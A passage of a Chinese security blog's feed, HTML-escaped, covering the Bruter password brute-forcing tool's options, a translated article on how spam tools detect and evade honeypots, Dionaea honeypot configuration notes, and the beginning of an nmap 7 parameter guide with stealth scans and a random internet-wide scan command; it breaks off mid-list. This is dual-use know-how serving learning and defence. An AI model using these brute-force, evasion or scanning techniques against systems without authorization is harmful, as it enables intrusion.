&lt;h2 id=&quot;0x01-介绍&quot;&gt;&lt;a href=&quot;#0x01-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 介绍&quot;&gt;&lt;/a&gt;0x01 介绍&lt;/h2&gt;&lt;p&gt;Bruter是一个多线程暴力破解器，这款工具的诞生是为了证明选择强口令的重要性（反正我是信了~~），我们的目标是支持多种允许远程登录认证的服务。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;警告：请记住，这款工具只能用于合法的目的&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x02-使用方法&quot;&gt;&lt;a href=&quot;#0x02-使用方法&quot; class=&quot;headerlink&quot; title=&quot;0x02 使用方法&quot;&gt;&lt;/a&gt;0x02 使用方法&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;连接选项，输入目标和选择协议的地方&lt;ol&gt;
&lt;li&gt;目标：可以输入ipv4和host，不支持批量操作&lt;/li&gt;
&lt;li&gt;协议：不同的协议有不同的选项，更多协议内容查看协议相关文档&lt;/li&gt;
&lt;li&gt;端口：一般会有默认端口号，也可以手动修改&lt;/li&gt;
&lt;li&gt;SSL：是否使用SSL，选择时端口号也相应会改变&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;代理选项&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用代理：选择是否使用代理&lt;/li&gt;
&lt;li&gt;类型：支持HTTP、socks4、socks5代理&lt;/li&gt;
&lt;li&gt;让代理解析host：选择本地解析还是让代理决定&lt;/li&gt;
&lt;li&gt;端口：代理端口&lt;/li&gt;
&lt;li&gt;&lt;p&gt;要求认证：查看代理是否需要验证&lt;/p&gt;
&lt;p&gt; 注意： http连接只支持基础认证；&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;socks5只支持用户名/密码认证
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;账号和密码：输入账号和密码的地方&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;爆破用户名选项&lt;ol&gt;
&lt;li&gt;输入用户名或者用户名列表路径。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;密码模式选项&lt;ol&gt;
&lt;li&gt;联合模式：当你的密码或列表输入使用username:password形式时，会自动去提取“：”后的password&lt;br&gt; 注意：会忽视username的内容；可以在选项里选择分隔符&lt;/li&gt;
&lt;li&gt;字典模式：正常的模式，可以输入单个密码或者列表路径，不同之处在于它可以变量替换，类似（%username%）的输入可以将爆破用到的所有用户名添加到密码中来。&lt;br&gt; 注意：空密码就用空字符，而不是用空格；由于替换规则，你用不了“%username%”这个密码；使用时会先加载全部密码到内存，所以密码字典不要太大&lt;/li&gt;
&lt;li&gt;暴力模式：根据提供的字符进行遍历&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;字典选项，使用字典模式附带的选项&lt;ol&gt;
&lt;li&gt;小写，转化所有输入为小写&lt;/li&gt;
&lt;li&gt;大写，转化所有输入为大写&lt;/li&gt;
&lt;li&gt;大写首字母&lt;/li&gt;
&lt;li&gt;翻转&lt;/li&gt;
&lt;li&gt;重复两次，将输入的admin，变为adminadmin&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;杂项选项&lt;ol&gt;
&lt;li&gt;连接数：设置进程数，win限制最大为64&lt;/li&gt;
&lt;li&gt;最大重试数：同一个用户密码尝试次数&lt;/li&gt;
&lt;li&gt;超时：整个破解过程使用多长时间&lt;/li&gt;
&lt;li&gt;重试时间：同一个用户密码尝试间隔时间&lt;/li&gt;
&lt;li&gt;重试时间：不同的用户密码尝试间隔时间&lt;/li&gt;
&lt;li&gt;最大接受连接数：有两个值，-1表示自动检测；0表示直到服务断开&lt;/li&gt;
&lt;li&gt;当发现有成功结果时是否停止&lt;/li&gt;
&lt;li&gt;密码优先：这个选项会使程序优先以密码去遍历用户名&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;显示区&lt;ol&gt;
&lt;li&gt;结果&lt;/li&gt;
&lt;li&gt;正在测试情况&lt;/li&gt;
&lt;li&gt;返回信息&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;状态栏&lt;ol&gt;
&lt;li&gt;第一列：当前任务状态&lt;/li&gt;
&lt;li&gt;第二列：每秒爆破数&lt;/li&gt;
&lt;li&gt;第三列：总测试数&lt;/li&gt;
&lt;li&gt;第四列：总用时&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;菜单&lt;ol&gt;
&lt;li&gt;文件：保存和退出&lt;/li&gt;
&lt;li&gt;设置：可以加载默认设置、保存设置、加载设置&lt;/li&gt;
&lt;li&gt;日志：选择输出的日志级别&lt;/li&gt;
&lt;li&gt;帮助：不用说了&lt;h2 id=&quot;0x03-后记&quot;&gt;&lt;a href=&quot;#0x03-后记&quot; class=&quot;headerlink&quot; title=&quot;0x03 后记&quot;&gt;&lt;/a&gt;0x03 后记&lt;/h2&gt;话说，3389的爆破工具都有哪些？以前似乎听说过一些，但是现在好像都销声匿迹了，是因为MS这方面防护做的更好了，3389爆破测试工具难以绕过一些规则吗？&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原创文章，转载请注明： 转载自零の杂货铺&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;说到爆破神器，kali中的msf爆破插件、hydra、medusa都足够强大，这里推荐一款win环境使用的爆破测试工具，bruter。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://phantom0301.github.io/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="bruter" scheme="http://phantom0301.github.io/tags/bruter/"/>
    
      <category term="爆破" scheme="http://phantom0301.github.io/tags/%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>反蜜罐技术学习</title>
    <link href="http://phantom0301.github.io/2016/03/23/Antihoneypot/"/>
    <id>http://phantom0301.github.io/2016/03/23/Antihoneypot/</id>
    <published>2016-03-23T04:08:28.000Z</published>
    <updated>2016-08-04T07:58:54.731Z</updated>
    
    <content type="html">&lt;p&gt;之前都在卖盾了，这次讲讲卖矛的故事。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x00-写在最先&quot;&gt;&lt;a href=&quot;#0x00-写在最先&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在最先&quot;&gt;&lt;/a&gt;0x00 写在最先&lt;/h2&gt;&lt;p&gt;翻译自别人的文章，Neal Krawetz，hackerfactor网站的创建者，主要从事反垃圾邮件、计算机取证和安全方面的研究。&lt;/p&gt;
&lt;p&gt;还是一样，有错直接留言 ：）&lt;br&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160323113106.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;有意思的插图，图侵删&lt;/p&gt;
&lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;垃圾邮件发送者经常扫描一些网络中开放的代理中继，通过代理，他们可以隐藏自己的原始IP。然而，假如他们不走运的遇到了蜜罐服务，蜜罐会收集一些有价值的信息，而这些信息可以帮助我们判断垃圾邮件散播者的真实身份，揭去他们的面具。&lt;/p&gt;
&lt;p&gt;作为对蜜罐的回应，第一个商业化的反蜜罐技术已经出现，Send-Safe的蜜罐猎人们试图为垃圾邮件发送工具找到安全的代理。这种蜜罐检测系统和其他新兴的垃圾邮件工具，呈现出三个重要的特征：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;蜜罐正在影响发送者&lt;/li&gt;
&lt;li&gt;目前的蜜罐技术是可检测的&lt;/li&gt;
&lt;li&gt;大多数蜜罐识别系统很相似&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不只是垃圾邮件的发送者会掌握这一技术，其他的恶意组织也会从相似的技术中受益，所以我们需要去研究反蜜罐技术，来改善目前的蜜罐技术。&lt;/p&gt;
&lt;h2 id=&quot;0x02-基础蜜罐服务&quot;&gt;&lt;a href=&quot;#0x02-基础蜜罐服务&quot; class=&quot;headerlink&quot; title=&quot;0x02 基础蜜罐服务&quot;&gt;&lt;/a&gt;0x02 基础蜜罐服务&lt;/h2&gt;&lt;p&gt;蜜罐按照一个看似有效的系统来设计。前面也说了，它使用这个模拟系统的外壳来收集攻击者的信息和方法。&lt;/p&gt;
&lt;p&gt;为了让自己伪装的更到位，蜜罐提供多种多样看似脆弱的系统。尽管如此的多样，但是总的来说，可以具体分为以下四级：最低限度、有限制、仿照模拟、完全一样。复杂度自然从低到高。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最低限度的服务，只是提供一个开放的服务端口&lt;/li&gt;
&lt;li&gt;有限制的服务，提供一些基础的交互&lt;/li&gt;
&lt;li&gt;仿照模拟的服务，提供一些复杂的交互&lt;/li&gt;
&lt;li&gt;完全真实一样，自然是提供一个真实的服务完整的支持&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一些最低限度的服务会返回基本的连接头，但通常不会有更多细节的内容。一个最典型的例子就是模拟SMTP服务的蜜罐BOF，对于攻击，它只会返回一个“&lt;em&gt;503 Service Unavailable&lt;/em&gt;”&lt;/p&gt;
&lt;p&gt;最低限度服务通过增加一些少量的交互，就成了有限制的服务。有限制的服务可以呈现出基础交互的功能，即时没有认证机制可用。BOF蜜罐模拟的telnet服务就是这样，它会提示输入账号和密码，但没有运行任何登录机制。Niels Provos和他的研究组有一个网页介绍他们的honeyd项目&lt;a href=&quot;http://www.citi.umich.edu/u/provos/honeyd/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;戳这里&lt;/a&gt;，这个项目提供一系列有限制服务的蜜罐脚本，包括SMTP和简单的WEB代理。&lt;/p&gt;
&lt;p&gt;仿照模拟的服务呈现出一个完整的工作过程，但不是真实的。它会记录下行为，但不执行外部的操作。模拟服务接收登录和登陆后的一系列请求，会返回那些通常已知的标准回复和错误信息。比如那些仿真完整SMTP和微软IIS网页服务的脚本程序。&lt;/p&gt;
&lt;p&gt;和以上提到的虚拟蜜罐相比，完全真实的蜜罐服务很少见。他们不仅只是回复请求，它们还可以和恶意程序充分互动，甚至接收被破坏。大多数的完全蜜罐也会限制一些连接，这样可以防止这些真实蜜罐被攻破后作为Dos攻击的一部分。&lt;/p&gt;
&lt;p&gt;尽管crackers或者black—hat在攻击时会使用多个代理，大多数的垃圾邮件工具只支持单一代理。如果蜜罐伪装成代理，那么垃圾邮件发送者的真实IP就会暴露给蜜罐。我们可以用这些信息进行取证。&lt;/p&gt;
&lt;h2 id=&quot;0x03-垃圾邮件发送者的反击&quot;&gt;&lt;a href=&quot;#0x03-垃圾邮件发送者的反击&quot; class=&quot;headerlink&quot; title=&quot;0x03 垃圾邮件发送者的反击&quot;&gt;&lt;/a&gt;0x03 垃圾邮件发送者的反击&lt;/h2&gt;&lt;p&gt;垃圾邮件发送者通常是被动的，当工具失效时，他们只能换其他工具。举个例子，最早的反垃圾邮件技术使用哈希散列表过滤的方法来将每一封邮件内容加到一个散列表中。重复的散列表示重复的内容，这就意味着，它是重复被邮寄出去的。为了应对散列系统，垃圾邮件技术研究者们创造了哈希克星，可以通过生成不同字符串来改变哈希值。同样，时至今天，批量邮件发送工具使用反贝叶斯编码的方法来对抗贝叶斯过滤器。&lt;/p&gt;
&lt;p&gt;Send-Safe套件是一款被广泛使用的商业邮件批量发送工具套件，它的很多功能在垃圾邮件发送者眼里都很实用。它的代理扫描器可以发现很多开放的代理服务来隐藏发送者的身份；它的其他工具包括邮件校验器和生成大量即时信息的工具。&lt;/p&gt;
&lt;p&gt;这一套件最新的工具——“蜜罐猎人”，帮助垃圾邮件发送者识别他们需要警惕的蜜罐。工具的开发人员在工具描述中暗示了收到蜜罐影响的群体。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“Send-Safe Honeypot&lt;br&gt;Hunter is a tool designed for&lt;br&gt;checking lists of HTTPS and&lt;br&gt;SOCKS proxies for so called&lt;br&gt;“honey pots”. “Honey pots”&lt;br&gt;are fake proxies run by the&lt;br&gt;people who are attempting to&lt;br&gt;frame bulkers by using those&lt;br&gt;fake proxies for logging traffic&lt;br&gt;through them and then send&lt;br&gt;complaints to ones’ ISPs.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们可以充分认识到垃圾邮件发送者不是唯一的蜜罐“受害者”。&lt;/p&gt;
&lt;p&gt;有一点我们必须意识到的是，垃圾邮件发送工具并没有使用什么独特的技术。使用副本和加密副本来增加分布是一种古老的IRC Dos攻击。我们可以通过查询发送邮件服务中的“VRFY”查询邮件发送的地址，这是一种常用的信息收集手段。&lt;/p&gt;
&lt;p&gt;蜜罐猎人使用的是网络“地下社团”众所周知的蜜罐检测方法，这些方法有很多，当然其中的一些也很复杂。一些开源的蜜罐项目在安装过程中有默认的固定回复，而安装者往往不会去改变这些默认信息，这就提供给攻击者一个辨识蜜罐的独特方法。其他的方法还有，已知程序的错误处理、操作系统指纹识别、TCP序列分析和ARP地址。&lt;/p&gt;
&lt;h2 id=&quot;0x03-蜜罐猎人干了什么？&quot;&gt;&lt;a href=&quot;#0x03-蜜罐猎人干了什么？&quot; class=&quot;headerlink&quot; title=&quot;0x03 蜜罐猎人干了什么？&quot;&gt;&lt;/a&gt;0x03 蜜罐猎人干了什么？&lt;/h2&gt;&lt;p&gt;蜜罐猎人被设计成可以测试开放的代理连接，对于回应进行定位分级，它把代理的等级分割为安全（好的代理），失效（不能用的代理），陷阱（蜜罐）三种。蜜罐猎人目前测试端口1080的Socks4和Socks5代理以及其他的http代理。&lt;/p&gt;
&lt;p&gt;蜜罐猎人会执行一系列简单的测试。首先,它打开了一个错误的邮件服务器在　　本地系统(端口25)测试代理连接,然后连接到代理服务器的端口。连接后,蜜罐猎人尝试返回到自己错误的邮件服务器。这样的方法足够识别那些无效的代理和蜜罐。另外,如果远程服务器声称已经成功连接,但蜜罐猎人的虚假邮件服务器没有收到连接,那么这个代理可能是蜜罐。&lt;/p&gt;
&lt;h2 id=&quot;0x03-对于蜜罐的影响&quot;&gt;&lt;a href=&quot;#0x03-对于蜜罐的影响&quot; class=&quot;headerlink&quot; title=&quot;0x03 对于蜜罐的影响&quot;&gt;&lt;/a&gt;0x03 对于蜜罐的影响&lt;/h2&gt;&lt;p&gt;影响是显而易见的，如果恶意用户可以检测到蜜罐，那么他们就可以绕过蜜罐。&lt;/p&gt;
&lt;p&gt;对于低交互的蜜罐，影响可能仅仅是少收集一些攻击信息。&lt;/p&gt;
&lt;p&gt;但更重要的是，如果攻击者可以检测出蜜罐，他们既可以针对蜜罐进行攻击。三个最基本的攻击方法是：利用、投毒和学习研究。研究者通常会把蜜罐放在临近关键网络的一个孤立的局域网中。通过利用的方式，可以让蜜罐成为内部攻击的跳台。当然，也可以利用蜜罐作为跳板攻击整个互联网。&lt;/p&gt;
&lt;p&gt;取代利用的手段还有投毒，通过将大量无用信息投掷给蜜罐，可以利用噪声掩盖住蜜罐中有价值的信息，使得其他恶意攻击者不被发现。&lt;/p&gt;
&lt;p&gt;第三种方式就是去学习蜜罐，通过收集蜜罐的信息，可以提供给攻击者一个观察蜜罐使用者的视角，包括收集蜜罐使用者的个人信息、作息习惯和技能水平。甚至于可以收集蜜罐使用组织的情况，比如一个使用ORACLE蜜罐的公司很有可能运行着真正的oracle数据服务，或者他就是该服务的提供商。&lt;/p&gt;
&lt;h2 id=&quot;0x04-后记&quot;&gt;&lt;a href=&quot;#0x04-后记&quot; class=&quot;headerlink&quot; title=&quot;0x04 后记&quot;&gt;&lt;/a&gt;0x04 后记&lt;/h2&gt;&lt;p&gt;文章的后半段讲述了如何对抗反蜜罐技术，这个不是我这次翻译的重点，就不在这里贴出来了，有兴趣的可以阅读原文。&lt;/p&gt;
&lt;p&gt;最后，作者总结道，由于反蜜罐技术的出现，很多蜜罐服务提供商都面临一些困境，总的来就是，蜜罐技术侦查的蜜月期已经结束，接下来的很长一段时间都将是蜜罐技术与反蜜罐技术互相斗法的阶段，无论你是旁观者，还是参与者，这样的对决一定有许多值得我们学习的地方。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;之前都在卖盾了，这次讲讲卖矛的故事。&lt;/p&gt;
    
    </summary>
    
      <category term="蜜罐" scheme="http://phantom0301.github.io/categories/%E8%9C%9C%E7%BD%90/"/>
    
    
      <category term="蜜罐" scheme="http://phantom0301.github.io/tags/%E8%9C%9C%E7%BD%90/"/>
    
  </entry>
  
  <entry>
    <title>MHN学习笔记（二）Dionaea蜜罐架构</title>
    <link href="http://phantom0301.github.io/2016/03/17/DIonaea/"/>
    <id>http://phantom0301.github.io/2016/03/17/DIonaea/</id>
    <published>2016-03-17T10:51:04.000Z</published>
    <updated>2016-08-04T07:57:36.108Z</updated>
    
    <content type="html">&lt;p&gt;上次记录了学习hpfeeds协议的一些收获，这次将介绍开源项目中的一款模拟功能丰富的蜜罐——dionaea。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;百度、google、github一下dionaea，就能看到很多关于这个蜜罐的简介、使用情况以及对蜜罐捕获数据的分析。&lt;/p&gt;
&lt;p&gt;其实dionaea项目现在可以分成两种，一种是原生的dioanea蜜罐，另一种是经过MHN改造后的dionaea，两者的服务模拟、捕获数据构成等略有不同。不过，这两种dionaea蜜罐我都尝试搭建并成功运行。所以，这次我打算从代码构成的角度讲讲dionaea蜜罐。&lt;/p&gt;
&lt;p&gt;按照你能成功的方式安装好dionaea蜜罐后，dionaea文件夹下会有如下的几个文件。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dioanea
|-bin
|-etc
|-include
|-lib
|-share
|-var
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;bin：运行的主要程序的可执行文件&lt;/li&gt;
&lt;li&gt;etc：dionaea的配置文件&lt;/li&gt;
&lt;li&gt;include：各种系统的环境需求&lt;/li&gt;
&lt;li&gt;lib：库文件以及服务模拟文件存储文件夹&lt;/li&gt;
&lt;li&gt;var：蜜罐系统日志以及捕获数据的存储文件夹&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里，我会详细介绍配置文件和捕获数据文件&lt;/p&gt;
&lt;h2 id=&quot;0x02-配置文件&quot;&gt;&lt;a href=&quot;#0x02-配置文件&quot; class=&quot;headerlink&quot; title=&quot;0x02 配置文件&quot;&gt;&lt;/a&gt;0x02 配置文件&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;etc
|-dionaea
    |-dionaea.conf
    |-dionaea.conf.dist
    |-dionaea.conf.org
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;作为蜜罐的配置文件，这里对于蜜罐运行时加载的协议、文件存储的位置、监听的端口等做了详细的描述。&lt;/p&gt;
&lt;p&gt;第一个参数是logging，负责存储蜜罐运行过程中的默认日志和出错日志的路径和日志等级设定&lt;/p&gt;
&lt;p&gt;第二个参数是processors，负责加载几个对于捕获数据进行过滤的程序，包括二进制流、会话等&lt;/p&gt;
&lt;p&gt;第三个参数是download，负责恶意程序的下载路径&lt;/p&gt;
&lt;p&gt;第四个参数是bistreams，负责二进制流下载路径&lt;/p&gt;
&lt;p&gt;第五个参数submit，负责第三方数据提交&lt;/p&gt;
&lt;p&gt;第六个参数是listen，负责蜜罐监听ip的设置，有三种模式。getifaddrs模式监听所有ip，包括自己的127.0.0.1。manual模式允许用户设置不进行监听的ip。nl模式加载一个列表监听。&lt;/p&gt;
&lt;p&gt;第七个参数是modules，加载用到的模块，lib中服务模拟的python程序就会在这里加载，捕获数据入库也在这里进行设置&lt;/p&gt;
&lt;p&gt;从配置文件中，可以看出dionaea的许多功能都处于开发阶段，还有一部分功能被注释掉了，喜欢探索的高级玩家可以解开注释的封印，去试试dionaea的洪荒之力~~ 中二ing~~&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;上次记录了学习hpfeeds协议的一些收获，这次将介绍开源项目中的一款模拟功能丰富的蜜罐——dionaea。&lt;/p&gt;
    
    </summary>
    
      <category term="蜜罐" scheme="http://phantom0301.github.io/categories/%E8%9C%9C%E7%BD%90/"/>
    
    
      <category term="蜜罐" scheme="http://phantom0301.github.io/tags/%E8%9C%9C%E7%BD%90/"/>
    
  </entry>
  
  <entry>
    <title>nmap7完全指南</title>
    <link href="http://phantom0301.github.io/2016/03/11/nmap7/"/>
    <id>http://phantom0301.github.io/2016/03/11/nmap7/</id>
    <published>2016-03-11T02:50:07.000Z</published>
    <updated>2016-08-04T07:57:52.428Z</updated>
    
    <content type="html">&lt;h2 id=&quot;0x00-基本介绍&quot;&gt;&lt;a href=&quot;#0x00-基本介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 基本介绍&quot;&gt;&lt;/a&gt;0x00 基本介绍&lt;/h2&gt;&lt;p&gt;整合了官网和网上的一些资料，本来是有配图的，但是一想到可能会暴露一些敏感信息，就不摆在这了，不足之处，欢迎交流。&lt;/p&gt;
&lt;p&gt;Nmap现在最新的版本是Nmap 7。主要是增加了IPV6和ssl方面的支持。&lt;/p&gt;
&lt;p&gt;Nmap，全称Network Mapper，开源网络探测与审计框架。使用构造异常IP包的方式来探测主机服务。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;完整的Namp套件包括界面图形化的Zenmap，数据传输、重定向与调试工具Ncat，扫描结果比较器Ndiff以及数据包生成与响应工具Nping。&lt;/p&gt;
&lt;p&gt;最常规的Nmap组成指令为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap [扫描类型] [选项] [目标]
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x02-参数-【目标】&quot;&gt;&lt;a href=&quot;#0x02-参数-【目标】&quot; class=&quot;headerlink&quot; title=&quot;0x02 参数-【目标】&quot;&gt;&lt;/a&gt;0x02 参数-【目标】&lt;/h2&gt;&lt;p&gt;目标参数可以输入域名、IP、网络等&lt;br&gt;例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www.baidu.com
microsoft.com/24
192.168.0.1
10.0.0-255.1-254
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;另外还有如下参数可选：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;-iL &amp;lt;文件名&amp;gt;，从表单中读取扫描目标。&lt;/li&gt;
&lt;li&gt;-iR &amp;lt;主机数量&amp;gt;，选取随机扫描目标，私有段ip、多播ip、未分配使用的ip会被自动跳过，&lt;0&gt;可以指定一个无休止的扫描，如果在一个雨天的午后，你十分无聊的时候，可以运行。&lt;br&gt;&lt;code&gt;nmap -Pn -sS -p 80 -iR 0 --open&lt;/code&gt;&lt;/0&gt;&lt;/li&gt;
&lt;li&gt;–exclude &amp;lt;主机1&amp;gt;，&amp;lt;主机2&amp;gt;，跳过部分目标。&lt;/li&gt;
&lt;li&gt;–exclude &amp;lt;文件名&amp;gt;，从表单中读取跳过目标。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;0x03-参数-【主机发现】&quot;&gt;&lt;a href=&quot;#0x03-参数-【主机发现】&quot; class=&quot;headerlink&quot; title=&quot;0x03 参数-【主机发现】&quot;&gt;&lt;/a&gt;0x03 参数-【主机发现】&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;-sL，列表扫描，通过访问DNS的方式得到目标主机的ip。&lt;/li&gt;
&lt;li&gt;-sn，不进行端口扫描，ping scan。&lt;/li&gt;
&lt;li&gt;-Pn，不进行ping，强行扫描。&lt;/li&gt;
&lt;li&gt;-PS &amp;lt;端口列表&amp;gt;，TCP SYN Ping扫描端口&lt;/li&gt;
&lt;li&gt;-PA &amp;lt;端口列表&amp;gt;，TCP ACK Ping扫描端口&lt;/li&gt;
&lt;li&gt;-PU &amp;lt;端口列表&amp;gt;，UDP Ping&lt;/li&gt;
&lt;li&gt;-PY &amp;lt;端口列表&amp;gt;，SCTP INIT Ping&lt;/li&gt;
&lt;li&gt;-PE;-PP;-PM，ICMP Ping Types&lt;/li&gt;
&lt;li&gt;-PO &amp;lt;协议号&amp;gt;，IP Protocol Ping&lt;/li&gt;
&lt;li&gt;-PR，ARP Ping&lt;/li&gt;
&lt;li&gt;–disable-arp-pin 不使用ARP ping&lt;/li&gt;
&lt;li&gt;–traceroute 探测到达主机的Trace路径&lt;/li&gt;
&lt;li&gt;-n 不使用DNS结果&lt;/li&gt;
&lt;li&gt;-R 始终使用DNS结果&lt;/li&gt;
&lt;li&gt;–system-dns 使用系统的DNS解析，不请求域名服务器&lt;/li&gt;
&lt;li&gt;–dns-servers &amp;lt;服务1&amp;gt;,&amp;lt;服务2&amp;gt; 查询的DNS服务器队列&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers&quot; title=&quot;protocol_list&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x04-参数-【端口扫描】&quot;&gt;&lt;a href=&quot;#0x04-参数-【端口扫描】&quot; class=&quot;headerlink&quot; title=&quot;0x04 参数-【端口扫描】&quot;&gt;&lt;/a&gt;0x04 参数-【端口扫描】&lt;/h2&gt;&lt;p&gt;使用六种状态描述端口状态：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;open，端口积极接收数据&lt;/li&gt;
&lt;li&gt;closed，无应用程序监听此端口&lt;/li&gt;
&lt;li&gt;filtered，端口难以抵达，无法准确判断&lt;/li&gt;
&lt;li&gt;unfiltered，端口可以抵达，无法准确判断&lt;/li&gt;
&lt;li&gt;open|filtered，两种状态不确定&lt;/li&gt;
&lt;li&gt;closed|filtered，两种状态不确定&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li&gt;-sS，TCP SYN scan，默认状态下的扫描模式，半开扫描，扫描快速，动静小。&lt;/li&gt;
&lt;li&gt;-sT，TCP connect scan，当没有原始数据包特权时使用，容易被发现。&lt;/li&gt;
&lt;li&gt;-sU，UDP scans，扫描UDP服务端口，DNS/SNMP/DHCP&lt;/li&gt;
&lt;li&gt;-sY，SCTP INIT scan，SCTP是一种较新的用来替代TCP和UDP的协议，类似于1&lt;/li&gt;
&lt;li&gt;-sN;-sF;-sX，TCP NULL, FIN, and Xmas scans，利用RFC 793的一些漏洞来判断端口状态。改变一些特殊标志的比特值。更加隐蔽，可以逃过一些防火墙，但是系统协议必须严格遵守RFC 793。&lt;/li&gt;
&lt;li&gt;-sA，TCP ACK scan，不用来判断端口是否打开，用来探测防火墙过滤规则&lt;/li&gt;
&lt;li&gt;-sW，TCP Window scan，类似ACK scan，增加不同系统的细节，但是结果不一定可信，甚至有可能正好相反。&lt;/li&gt;
&lt;li&gt;-sM，TCP Maimon scan，Uriel Maimon发现的一些BSD的系统在端口打开时会简单的终止包&lt;/li&gt;
&lt;li&gt;–scanflags，Custom TCP scan，自己通过TCP标志的设置构造自己的扫描，可以使用：&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;*URG，紧急指针有效*

*ACK，确认序号有效*

*PSH，接收方应该尽快将这个报文段交给应用层*

*RST，重建连接*

*SYN，同步序号用来发起一个连接*

*FIN，发送端完成发送任务*
&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
&lt;li&gt;-sZ，SCTP COOKIE ECHO scan&lt;/li&gt;
&lt;li&gt;-sI &lt;zombie host=&quot;&quot;&gt;:&lt;probeport&gt;，idle scan，实现真正的盲扫，不会从你的真实IP发送包。使用边信道攻击实现僵尸机攻击。隐蔽性很好。&lt;/probeport&gt;&lt;/zombie&gt;&lt;/li&gt;
&lt;li&gt;-sO，IP protocol scan，ip协议扫描。&lt;/li&gt;
&lt;li&gt;-b，&amp;lt;主机&amp;gt;，FTP bounce scan，使用FTP代理扫描。因为使用FTP更容易绕过防火墙。&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;SCTP（Stream Control Transmission Protocol，流控制传输协议）&lt;/p&gt;
&lt;p&gt;BSD (Berkeley Software Distribution，伯克利软件套件)是Unix的衍生系统&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x05-参数-【端口号】&quot;&gt;&lt;a href=&quot;#0x05-参数-【端口号】&quot; class=&quot;headerlink&quot; title=&quot;0x05 参数-【端口号】&quot;&gt;&lt;/a&gt;0x05 参数-【端口号】&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;-p &amp;lt;端口范围&amp;gt;&lt;/li&gt;
&lt;li&gt;–exclude-ports &amp;lt;端口范围&amp;gt;&lt;/li&gt;
&lt;li&gt;-F，快速扫描常用端口，比默认的端口更少&lt;/li&gt;
&lt;li&gt;-r，按顺序扫描，默认情况下Nmap是随机扫描所指定的端口号的&lt;/li&gt;
&lt;li&gt;–port-ratio &amp;lt;比例&amp;gt;0-1之间，大于给的比例扫描servuces文件中的端口。&lt;/li&gt;
